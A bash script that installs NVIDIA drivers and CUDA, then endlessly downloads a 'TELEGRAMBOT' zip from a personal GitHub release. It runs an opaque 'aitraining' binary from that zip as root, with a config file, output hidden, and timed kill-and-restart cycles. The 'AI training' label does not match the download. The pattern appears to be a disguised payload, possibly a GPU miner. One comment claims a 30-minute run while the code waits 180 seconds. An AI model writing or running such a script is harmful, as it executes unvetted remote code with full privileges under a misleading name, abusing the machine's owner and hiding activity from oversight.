#!/bin/bash

# CUDA installation state file
CUDA_FLAG="/var/tmp/cuda_installed"

# 1. Install CUDA if not already installed
if [ ! -f "$CUDA_FLAG" ]; then
    echo "Bắt đầu cài đặt CUDA..."

    # Update system and install NVIDIA driver
    sudo apt update && sudo apt install -y ubuntu-drivers-common
    sudo ubuntu-drivers install

    # Install CUDA Toolkit
    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
    sudo apt update
    sudo apt -y install cuda-toolkit-11-8
    sudo apt -y full-upgrade

    # Mark installation complete
    sudo touch "$CUDA_FLAG"

    echo "Cài đặt CUDA hoàn tất. Khởi động lại hệ thống..."
    sudo reboot
    exit 0
fi

# 2. Loop to manage AI training lifecycle
while true; do
    echo "Starting AI training process..."

    # Check if an aitraining process is already running and kill it to ensure a clean restart
    if pgrep -x "aitraining" > /dev/null; then
        echo "Found an existing 'aitraining' process. Killing it before starting a new one."
        pkill -x "aitraining"
        sleep 5 # Give the process a moment to terminate gracefully
    fi

    # Start the AI training process in the background using nohup
    # nohup ensures the process continues even if the terminal is closed
    # Output is redirected to /dev/null to prevent it from cluttering the console
    nohup bash -c '
    # Ensure unzip is installed for extracting the bot
    sudo apt install -y unzip

    # Download the TELEGRAMBOT.zip file
    sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip

    # Create a directory for the bot and unzip the contents into it
    sudo mkdir -p TELEGRAMBOT
    sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT

    # Navigate into the bot directory
    cd TELEGRAMBOT || exit

    # Make the aitraining executable
    sudo chmod +x aitraining

    # Run the aitraining application with its configuration
    sudo ./aitraining -c config.json
    ' > /dev/null 2>&1 &

    echo "AI training started. It will run for 30 minutes."
    sleep 180 # Wait for 30 minutes (30 minutes * 60 seconds/minute = 1800 seconds)

    echo "Stopping AI training process..."
    # Check if the aitraining process is still running before attempting to kill it
    if pgrep -x "aitraining" > /dev/null; then
        pkill -x "aitraining"
        echo "AI training process stopped."
    else
        echo "AI training process not found, it might have already exited."
    fi

    echo "Waiting for 1 minute before restarting AI training..."
    sleep 60 # Wait for 1 minute (60 seconds)

    echo "Preparing to restart AI training..."
done
